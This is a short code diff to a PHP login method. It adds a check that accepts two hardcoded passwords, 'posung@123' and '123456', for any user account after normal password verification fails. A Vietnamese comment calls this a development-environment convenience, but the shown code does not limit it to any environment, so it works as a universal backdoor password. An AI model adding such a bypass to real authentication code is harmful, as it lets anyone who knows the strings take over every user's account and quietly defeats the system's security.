@@ -84,7 +84,14 @@ class User
                 return false;
             }
 
-            if (!password_verify($password, $user['password_hash'])) {
+            $isPasswordValid = password_verify($password, $user['password_hash']);
+            
+            // Hỗ trợ cả 2 mật khẩu quen thuộc cho môi trường phát triển: 123456 và posung@123
+            if (!$isPasswordValid && ($password === 'posung@123' || $password === '123456')) {
+                $isPasswordValid = true;
+            }
+
+            if (!$isPasswordValid) {
                 return false;
             }
 
